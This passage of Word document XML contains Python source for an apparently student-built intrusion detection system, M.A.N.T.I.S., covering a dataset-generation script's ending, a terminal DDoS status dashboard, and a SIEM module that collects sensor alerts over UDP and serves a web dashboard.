    </w:p>
    <w:p w14:paraId="2B18BB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writer = csv.writer(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED0BF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writer.writerow(header)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595266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writer.writerows(all_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493834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C5583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size_mb = os.path.getsize(OUTPUT) / (1024 * 1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4793A1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print(f"[+] Done! {len(all_rows):,} rows, {size_mb:.1f} MB")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05ADBE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print()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75624F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print("[*] Label distribution:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57851F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label, count in sorted(label_counts.items(), key=lambda x: -x[1]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290374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pct = (count / len(all_rows)) * 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049F1E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   {label:35s}: {count:&gt;8,} ({pct:5.1f}%)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6756B4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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0458F1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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633357B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B7DA6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423E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2B5B8D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random.seed(42)  # reproducible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72605A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t0 = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75842E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rc = main()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B05AF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print(f"\n[*] Elapsed: {time.time()-t0:.1f}s")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54258B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sys.exit(rc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5567B1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Dashboard, SIEM and Reporting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A77BA95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src/dashboard_ui/dashboard.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3DB254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(86 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEF36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270316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3C82B6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DA1B3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5D3C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Phase 5: CLI Dashboard (Visualization)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EBAB5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1984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Dashboard:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500660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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FAAB1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 = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727AFC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'pps': 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732ACA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'mean': 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB51D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'z_score': 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3CB7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'ddos_candidate': False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6698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'ddos_active': False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEA44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25010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 = [] # List of strings "Time - Message"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649D43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self.max_alerts = 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0029A5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C967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add_alert(self, message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418B30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timestamp = time.strftime("%H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BDAD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self.alerts.append(f"[{timestamp}] {message}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB882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len(self.alerts) &gt; self.max_alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3778CE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self.alerts.pop(0) # Keep logging window small</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3089A2A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32D8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update_stats(self, pps, mean, z_score, ddos_candidate=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A311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   ddos_active=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E3FB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self.stats['pps'] = pps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F40A5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self.stats['mean'] = mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2161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self.stats['z_score'] = z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A83E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self.stats['ddos_candidate'] = bool(ddos_candidate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E72C4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self.stats['ddos_active'] = bool(ddos_active)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E6D3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5C2F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refresh(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008D2D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431EED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Clears the terminal and reprints the status.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147C52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Uses ANSI escape codes for colors (Green/Red).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006299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61B032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Clear command for Windows vs  Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8414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os.system('cls' if os.name == 'nt' else 'clear')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491129D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7DE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Colors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2303A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GREEN = '\033[92m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E918A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RED = '\033[91m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10744D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YELLOW = '\033[93m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C535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CYAN = '\033[96m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B446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RESET = '\033[0m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF354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FABD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Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094F4F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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AA34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print(f"{GREEN}     M.A.N.T.I.S.  -  Intelligent Threat Detection System      {RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B578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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE6F6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7A6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Stats Panel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077923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pps = self.stats['pps']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D53AC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 = self.stats['z_score']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1FFDF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5EAB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Z-score alone is only unusual traffic. DDoS status also requires</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F82E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configured absolute PPS floor and sustained observations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2168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sys_color = GREEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EABF4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sys_status = "NORMAL"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CE81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self.stats['ddos_active']:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5A3A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sys_color = RED</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767E95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sys_status = "UNDER ATTACK (DDoS)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7140B9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self.stats['ddos_candidate']:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B202C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sys_color = YELLOW</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C484D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sys_status = "VERIFYING TRAFFIC SPIKE"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC42F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5772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SYSTEM STATUS : {sys_color}{sys_status}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE062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TRAFFIC VOLUME: {ppf_formatted(pps)} packets/sec")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311DC3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BASELINE MEAN : {self.stats['mean']:.2f} pps")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEB2D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Z-SCORE       : {sys_color}{z:.2f}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22304F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print(f"{GREEN}----------------------------------------------------------------{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325DC7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BE7D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Alert Log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EE6B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print(f"{CYAN} [ ALERT LOG ] {RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059982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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2FB5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print(f"   (No active threats detected)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5D47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479BE3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alert in reversed(self.alerts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427182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print(f" {RED}{alert}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AE0C4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1997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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD4BF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 Press Ctrl+C to Stop.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCBC99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0268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ppf_formatted(pps):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7E0E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str(pps).rjust(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520D756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src/dashboard_ui/siem.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695CC129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(329 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266B21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76E5A3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62BF51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60A685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6F51C0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2E609A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4B00E9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D0555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http.server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BA4C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socketserver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16199E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deque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEC91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urllib.parse import urlparse, parse_qs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6195F2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74AD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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272C19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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EDB7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77B048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from utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D37BB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3E9E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Phase 8: Enterprise SIEM (Security Information and Event Management)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594838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Central Dashboard for Multi-Sensor Deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BE09D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8B3F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CONFIG ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C05D6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UDP_PORT = 9999       # standard syslog port is 514, but we use 9999 to avoid root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FD61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HTTP_PORT = 8080      # Web Dashboard Port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31807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MAX_ALERTS = 100      # Keep last 100 alerts in memory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BE23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7089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SHARED STATE ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755025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Stores alerts in memory. Thread-safe enough for this scale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB36B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ALERT_HISTORY = deque(maxlen=MAX_ALERTS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6428B7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ACTIVE_SENSORS = {}   # Map of IP -&gt; Last Seen Timestamp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0910AE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F030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SyslogUDPHandler:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C708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port):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B194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self.port = port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA139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self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3A7E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Allow instant port reuse if the script restarts quickly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7122E4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self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B3E6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self.sock.bind(('0.0.0.0', self.port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9FB1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776F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start(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400D04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print(f"[*] SIEM UDP Listener started on port {self.port}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E70A2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re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521979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legacy_format = re.compile(r'^\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\]')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3643FD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61AF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True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638B60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data, addr = self.sock.recvfrom(8192)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75046C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sensor_ip = addr[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B4CC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 = data.decode('utf-8', errors='replace').strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440728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B94B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FR-5 sends structured JSON. Fall back to the original bracketed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8724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text format so a sensor running older code still reports, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A01E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reject anything else - port 9999 is itself a scan target, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AF4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arbitrary bytes do arrive here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733356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entry = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139062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raw.startswith('{'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251B7D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2AB61B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frame = json.loads(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2753A5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if isinstance(frame, dict) and "message" in frame:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0A09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entry = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F154B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"message": frame.get("message", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0FF1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"severity": frame.get(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BB88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"severity",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327296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self._get_severity(frame.get("message", ""))),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F1D6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"src_ip": frame.get("src_ip", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C06A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"engine": frame.get("engine", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B2B4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"kind": frame.get("kind", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD191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"technique_id": frame.get("technique_id", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C98D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"technique": frame.get("technique", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33366E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"tactic": frame.get("tactic", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2868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"risk_score": frame.get("risk_score", 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B493A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"confidence": frame.get("confidence"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136616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"payload_excerpt": frame.get("payload_excerpt", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8A35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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27333A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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734CBA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entry = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6197CF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F759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entry is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072E1F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legacy_format.match(raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6A5D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message = raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8B92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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B896F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message = ("INVALID UDP PAYLOAD (Raw Binary/Port Scan "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72853B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"detected on SIEM Listener)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5A14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entry = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C3D0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"message": message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4118BD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"severity": self._get_severity(message),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3095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"src_ip": "", "engine": "", "kind": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE11D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"technique_id": "", "technique": "", "tactic": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062F42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"risk_score": 0, "confidence": None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1C2B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"payload_excerpt": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B6ED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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B9029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A496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Update Sensor Status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A20F4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ACTIVE_SENSORS[sensor_ip] = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3FF5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C7CF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entry["id"] = len(ALERT_HISTORY) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118019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entry["time"] = time.strftime("%H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5F27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entry["sensor"] = sensor_ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6833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ALERT_HISTORY.appendleft(entry)  # Newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B902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print("[+] %s | %s | %s" % (sensor_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752110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entry.get("technique_id") or "-",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107C34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entry["message"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EC09C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3F20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_get_severity(self, msg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DE3E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"DDoS" in msg: return "CRITICAL"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260D7C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"PAYLOAD" in msg: return "HIGH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6ADD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"SCAN" in msg: return "MEDIUM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CAEB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"INFO"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A6DC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65475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6E49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Real host telemetry (Linux /proc, zero dependencies) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29158A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_LAST_CPU = {"total": 0, "idle": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7495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8943B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F79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read_cpu_percent():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5870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"""CPU utilisation from /proc/stat, sampled between calls. Linux only."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D162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38AD2B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open("/proc/stat") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667C05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parts = f.readline().split()[1:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE94C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vals = [int(x) for x in parts]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172277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idle = vals[3] + (vals[4] if len(vals) &gt; 4 else 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20499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total = sum(vals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425B1B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d_total = total - _LAST_CPU["total"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2EF2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d_idle = idle - _LAST_CPU["idle"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702A5C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_LAST_CPU["total"], _LAST_CPU["idle"] = total, idle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243B6F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d_total &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173709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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35819B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round(100.0 * (d_total - d_idle) / d_total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4842FC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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE69C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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460AE8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8CCC6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895A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read_mem_percent():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5750F3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"""Memory utilisation from /proc/meminfo. Linux only."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A6C1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335D92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info = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D681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open("/proc/meminfo") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3C2E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line in f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED9E4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k, v = line.split(":")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082F16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info[k.strip()] = int(v.split()[0])  # kB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116FFF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total = info.get("MemTotal", 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B5F8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avail = info.get("MemAvailable", info.get("MemFree", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30055F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total &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591E2A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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75414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round(100.0 * (total - avail) / total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6425E2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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6F5D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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7769CED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3157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WebDashboardHandler(http.server.SimpleHTTPRequestHandler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF9F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_send_json(self, obj):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDD84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body = json.dumps(obj).encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263E0B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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3545DD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self.send_header('Content-type', 'application/json; charset=utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5446AA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self.send_header('Content-Length', str(len(body)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F4F7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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D819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self.wfile.write(body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A63FF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4648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log_message(self, fmt, *args):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7844FA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pass  # silence per-request HTTP logging (keeps the console clean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0953531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A66E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do_GET(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DC5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route = urlparse(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5ECE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path = route.path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1409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params = parse_qs(route.query)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB24E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862E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path == '/':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA51E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= self._get_dashboard_html().encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388485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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0D42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self.send_header('Content-type', 'text/html; charset=utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB21B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self.send_header('Content-Length', str(len(body)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE0C5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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230F98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self.wfile.write(body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284F4F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B03D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path == '/api/stats':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55296E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now = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31933A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active_count = sum(1 for t in ACTIVE_SENSORS.values() if now - t &lt; 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783048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568C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ddos_count = sum(1 for a in ALERT_HISTORY if "DDoS" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665CF3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scan_count = sum(1 for a in ALERT_HISTORY if "SCAN" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F42D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payload_count = sum(1 for a in ALERT_HISTORY if "PAYLOAD" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30903B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blacklist_count = sum(1 for a in ALERT_HISTORY if "BLACKLIST" in a["message"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2851CF2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84FC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traffic = packet_store.STORE.stats_snapshot()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CA877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BAA5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ATT&amp;CK roll-up: which techniques were observed, and the highest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787213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risk score currently in the buffer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5B08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technique_counts = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5C3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max_risk = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F4F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a in ALERT_HISTORY:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6E4D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tid = a.get("technique_id")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB199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tid and tid != "N/A":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576BF9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key = "%s %s" % (tid, a.get("technique", ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64492D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technique_counts[key] = technique_counts.get(key, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667508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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D0A0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max_risk = max(max_risk, float(a.get("risk_score") or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A56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except (TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCE5F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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47345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top_techniques = sorted(technique_counts.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1DB3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key=lambda kv: kv[1], reverse=True)[:5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71879D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AC9C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stats = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0652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"online_sensors": active_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA2A5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"total_alerts": len(ALERT_HISTORY),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A7F6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"max_risk": round(max_risk, 1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B42A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"top_techniques": top_techniques,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDED9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"ddos_alerts": ddos_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564EC2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"scan_alerts": scan_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267C6B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"payload_alerts": payload_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3D92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"blacklist_alerts": blacklist_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C8F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"cpu_usage": read_cpu_percent(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279978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"mem_usage": read_mem_percent(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BDCD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# live traffic telemetry from the sensor's in-memory store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D913C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"pps": traffic["pps"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CB31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"z_score": traffic["z_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7932FE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"baseline": traffic["mean"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34603C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"ddos_candidate": traffic["ddos_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF975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"ddos_active": traffic["ddos_active"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F126A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"packets_buffered": traffic["buffered"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009B71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"packets_total": traffic["total_seen"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6659C4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"proto_counts": traffic["proto_counts"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD7EF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"top_talkers": packet_store.STORE.top_talkers(5),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FAF0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"alerts": list(ALERT_HISTORY),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF13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34BB1C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self._send_json(stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0942250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929F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path == '/api/packets':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190C78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limit = int(params.get("limit", ["200"])[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8A84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after = int(params.get("after", ["0"])[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730D3F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proto = params.get("proto", [None])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5AC5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query = params.get("q", [None])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B45C5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packets = packet_store.STORE.get_recent(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA3B6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limit=limit, proto=proto, query=query, after=after)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099529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self._send_json({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A67B2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"packets": packets,</w:t>
      </w:r>
    </w:p>
